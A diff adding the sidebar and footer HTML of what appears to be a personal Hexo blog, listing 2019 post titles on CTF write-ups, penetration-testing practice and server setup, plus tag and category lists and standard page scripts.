+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2019/09/22/zhejiang-ctf-College-Students-Online-competition/" >浙江省第二届大学生网络与信息安全竞赛线上赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2019/09/22/zhejiang-ctf-College-Students-Offline-competition/" >浙江省第二届大学生网络与信息安全竞赛线下赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href= "/2019/09/20/gc-xctf-gameapp/" >数字经济”云安全共测大赛初赛 gameapp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2019/09/17/kali-install/" >kali_install</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2019/09/10/spring-aliyun-oss/" >SpringBoot 整合 oss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2019/09/07/Raspbian3b-Buster/" >Raspbian3b+ 折腾 Buster</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2019/08/19/ubuntu-vsftpd/" >ubuntu 搭建 vsftpd 遇到的坑</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2019/08/07/vsftpd/" >centos7 安装配置 vsftpd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2019/08/07/idea-Generate/" >idea 自动添加get set</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/2019/08/02/centos7-docker/" >Centos7 安装 Docker-ce</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2019/08/01/centos7-mysql/" >centos7 yum 方式安装mysql</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2019/08/01/firewalld/" >firewalld</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2019/08/01/centos7-nginx/" >Centos7 安装 Nginx 实现 负载均衡和反向代理.</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href= "/2019/08/01/mysql-optimization2/" >Mysql 索引</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2019/07/31/centos7-install-tomcat/" >centos7 安装tomcat9</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2019/07/31/mysql-optimization/" >mysql 优化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/SpringBoot-profiles/" >SpringBoot 多环境配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/springboot-package/" >SpringBoot 打包</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/windows-tomcat/" >windows 安装tomcat</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2019/07/26/SpringBoot-Mapper/" >SpringBoot-Mapper</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2019/07/26/SpringBoot-jpa/" >SpringBoot-jpa</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2019/07/26/springboot-redis/" >springboot学习 整合redis</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2019/07/25/spirngboot-mybatis/" >spirngboot学习 整合mybatis</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2019/07/24/idea-auto-import/" >idea 自动导包</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2019/07/24/springboot-and-swagger2/" >学习SpringBoot之整合 Swagger2</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2019/07/24/vue/" >vue-cli 升级踩坑</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/07</span><a class="archive-post-title" href= "/2019/07/07/pentesterlab-xss/" >pentesterlab_xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/07</span><a class="archive-post-title" href= "/2019/07/07/pentesterlab/" >pentesterlab</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2019/06/30/hackbar/" >hackbar</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/27</span><a class="archive-post-title" href= "/2019/06/27/zsh/" >zsh</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2019/06/25/usbWindows10/" >usbWindows10</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/23</span><a class="archive-post-title" href= "/2019/06/23/WMITools/" >WMITools</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2019/06/22/jwt/" >jwt SrpingBoot</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/vs2019/" >vs2019 安装到非系统盘</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/2019/06/14/vue-change/" >vue-change</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2019/06/10/cmder-here/" >cmder-here</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href= "/2019/06/09/HTML%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93/" >HTML字符实体</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href= "/2019/06/09/bugku-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/" >bugku-你从哪里来</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/09</span><a class="archive-post-title" href= "/2019/06/09/bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B-SKCTF/" >bugku-前女友(SKCTF)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href= "/2019/06/08/pi-screen/" >树莓派分辨率调整</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2019/06/04/ctf-web/" >ctf-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/2019/05/04/hello-world/" >Hello world</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Burpsuite"><span class="iconfont-archer">&#xe606;</span>Burpsuite</span>
+    
+        <span class="sidebar-tag-name" data-tags="激活"><span class="iconfont-archer">&#xe606;</span>激活</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具使用"><span class="iconfont-archer">&#xe606;</span>工具使用</span>
+    
+        <span class="sidebar-tag-name" data-tags="Html"><span class="iconfont-archer">&#xe606;</span>Html</span>
+    
+        <span class="sidebar-tag-name" data-tags="实体字符"><span class="iconfont-archer">&#xe606;</span>实体字符</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="主页劫持"><span class="iconfont-archer">&#xe606;</span>主页劫持</span>
+    
+        <span class="sidebar-tag-name" data-tags="浏览器"><span class="iconfont-archer">&#xe606;</span>浏览器</span>
+    
+        <span class="sidebar-tag-name" data-tags="vmitools"><span class="iconfont-archer">&#xe606;</span>vmitools</span>
+    
+        <span class="sidebar-tag-name" data-tags="SrpingBoot"><span class="iconfont-archer">&#xe606;</span>SrpingBoot</span>
+    
+        <span class="sidebar-tag-name" data-tags="多环境"><span class="iconfont-archer">&#xe606;</span>多环境</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugku"><span class="iconfont-archer">&#xe606;</span>bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Bugku"><span class="iconfont-archer">&#xe606;</span>Bugku</span>
+    
+        <span class="sidebar-tag-name" data-tags="centos7"><span class="iconfont-archer">&#xe606;</span>centos7</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker-ce"><span class="iconfont-archer">&#xe606;</span>docker-ce</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="tomcat"><span class="iconfont-archer">&#xe606;</span>tomcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="cmder"><span class="iconfont-archer">&#xe606;</span>cmder</span>
+    
+        <span class="sidebar-tag-name" data-tags="cmder here"><span class="iconfont-archer">&#xe606;</span>cmder here</span>
+    
+        <span class="sidebar-tag-name" data-tags="regedit"><span class="iconfont-archer">&#xe606;</span>regedit</span>
+    
+        <span class="sidebar-tag-name" data-tags="右键清理"><span class="iconfont-archer">&#xe606;</span>右键清理</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="pentest"><span class="iconfont-archer">&#xe606;</span>pentest</span>
+    
+        <span class="sidebar-tag-name" data-tags="UEditor"><span class="iconfont-archer">&#xe606;</span>UEditor</span>
+    
+        <span class="sidebar-tag-name" data-tags="数字经济"><span class="iconfont-archer">&#xe606;</span>数字经济</span>
+    
+        <span class="sidebar-tag-name" data-tags="云安全共测大赛初赛"><span class="iconfont-archer">&#xe606;</span>云安全共测大赛初赛</span>
+    
+        <span class="sidebar-tag-name" data-tags="gameapp"><span class="iconfont-archer">&#xe606;</span>gameapp</span>
+    
+        <span class="sidebar-tag-name" data-tags="hackbar"><span class="iconfont-archer">&#xe606;</span>hackbar</span>
+    
+        <span class="sidebar-tag-name" data-tags="许可证"><span class="iconfont-archer">&#xe606;</span>许可证</span>
+    
+        <span class="sidebar-tag-name" data-tags="idea"><span class="iconfont-archer">&#xe606;</span>idea</span>
+    
+        <span class="sidebar-tag-name" data-tags="自动导包"><span class="iconfont-archer">&#xe606;</span>自动导包</span>
+    
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
+        <span class="sidebar-tag-name" data-tags="JSON Web Token"><span class="iconfont-archer">&#xe606;</span>JSON Web Token</span>
+    
+        <span class="sidebar-tag-name" data-tags="onetime"><span class="iconfont-archer">&#xe606;</span>onetime</span>
+    
+        <span class="sidebar-tag-name" data-tags="phone"><span class="iconfont-archer">&#xe606;</span>phone</span>
+    
+        <span class="sidebar-tag-name" data-tags="sms"><span class="iconfont-archer">&#xe606;</span>sms</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试资源"><span class="iconfont-archer">&#xe606;</span>渗透测试资源</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试学习"><span class="iconfont-archer">&#xe606;</span>渗透测试学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="pentesterlab"><span class="iconfont-archer">&#xe606;</span>pentesterlab</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="beef"><span class="iconfont-archer">&#xe606;</span>beef</span>
+    
+        <span class="sidebar-tag-name" data-tags="Raspberry Pi"><span class="iconfont-archer">&#xe606;</span>Raspberry Pi</span>
+    
+        <span class="sidebar-tag-name" data-tags="SpringBoot"><span class="iconfont-archer">&#xe606;</span>SpringBoot</span>
+    
+        <span class="sidebar-tag-name" data-tags="mybatis"><span class="iconfont-archer">&#xe606;</span>mybatis</span>
+    
+        <span class="sidebar-tag-name" data-tags="swagger2"><span class="iconfont-archer">&#xe606;</span>swagger2</span>
+    
+        <span class="sidebar-tag-name" data-tags="springboot"><span class="iconfont-archer">&#xe606;</span>springboot</span>
+    
+        <span class="sidebar-tag-name" data-tags="打包"><span class="iconfont-archer">&#xe606;</span>打包</span>
+    
+        <span class="sidebar-tag-name" data-tags="maven"><span class="iconfont-archer">&#xe606;</span>maven</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="ubuntu"><span class="iconfont-archer">&#xe606;</span>ubuntu</span>
+    
+        <span class="sidebar-tag-name" data-tags="vsftpd"><span class="iconfont-archer">&#xe606;</span>vsftpd</span>
+    
+        <span class="sidebar-tag-name" data-tags="usb"><span class="iconfont-archer">&#xe606;</span>usb</span>
+    
+        <span class="sidebar-tag-name" data-tags="windwos10"><span class="iconfont-archer">&#xe606;</span>windwos10</span>
+    
+        <span class="sidebar-tag-name" data-tags="安装系统"><span class="iconfont-archer">&#xe606;</span>安装系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="vs"><span class="iconfont-archer">&#xe606;</span>vs</span>
+    
+        <span class="sidebar-tag-name" data-tags="2019"><span class="iconfont-archer">&#xe606;</span>2019</span>
+    
+        <span class="sidebar-tag-name" data-tags="vs2019"><span class="iconfont-archer">&#xe606;</span>vs2019</span>
+    
+        <span class="sidebar-tag-name" data-tags="Visual Studio"><span class="iconfont-archer">&#xe606;</span>Visual Studio</span>
+    
+        <span class="sidebar-tag-name" data-tags="vue"><span class="iconfont-archer">&#xe606;</span>vue</span>
+    
+        <span class="sidebar-tag-name" data-tags="uni-app"><span class="iconfont-archer">&#xe606;</span>uni-app</span>
+    
+        <span class="sidebar-tag-name" data-tags="小程序"><span class="iconfont-archer">&#xe606;</span>小程序</span>
+    
+        <span class="sidebar-tag-name" data-tags="vue-cli"><span class="iconfont-archer">&#xe606;</span>vue-cli</span>
+    
+        <span class="sidebar-tag-name" data-tags="升级"><span class="iconfont-archer">&#xe606;</span>升级</span>
+    
+        <span class="sidebar-tag-name" data-tags="浙江省"><span class="iconfont-archer">&#xe606;</span>浙江省</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息安全"><span class="iconfont-archer">&#xe606;</span>信息安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="zsh"><span class="iconfont-archer">&#xe606;</span>zsh</span>
+    
+        <span class="sidebar-tag-name" data-tags="wsl2"><span class="iconfont-archer">&#xe606;</span>wsl2</span>
+    
+        <span class="sidebar-tag-name" data-tags="windows"><span class="iconfont-archer">&#xe606;</span>windows</span>
+    
+        <span class="sidebar-tag-name" data-tags="网络与信息安全"><span class="iconfont-archer">&#xe606;</span>网络与信息安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="nginx"><span class="iconfont-archer">&#xe606;</span>nginx</span>
+    
+        <span class="sidebar-tag-name" data-tags="优化"><span class="iconfont-archer">&#xe606;</span>优化</span>
+    
+        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
+    
+        <span class="sidebar-tag-name" data-tags="supervisor"><span class="iconfont-archer">&#xe606;</span>supervisor</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="waf"><span class="iconfont-archer">&#xe606;</span>waf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="pentest"><span class="iconfont-archer">&#xe60a;</span>pentest</span>
+    
+        <span class="sidebar-category-name" data-categories="pentest/xss"><span class="iconfont-archer">&#xe60a;</span>pentest/xss</span>
+    
+        <span class="sidebar-category-name" data-categories="pentest/xss/工具使用"><span class="iconfont-archer">&#xe60a;</span>pentest/xss/工具使用</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "keacwu"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
